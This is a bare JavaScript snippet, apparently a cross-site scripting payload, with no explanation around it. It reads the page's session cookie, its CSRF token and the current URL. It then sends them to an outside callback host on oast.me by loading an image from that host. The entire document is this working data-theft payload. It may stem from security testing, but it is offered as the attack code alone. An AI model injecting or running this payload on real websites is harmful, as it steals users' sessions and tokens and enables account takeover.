var d=document;
var cookie=d.cookie;
var csrf=d.querySelector('meta[name=csrf-token]').content;
var url=location.href;
var data='cookie='+encodeURIComponent(cookie)+'&csrf='+encodeURIComponent(csrf)+'&url='+encodeURIComponent(url);
new Image().src='https://da5tf7gh4jp0t4mqaro03tdnmf789hhws.oast.me/?'+data;
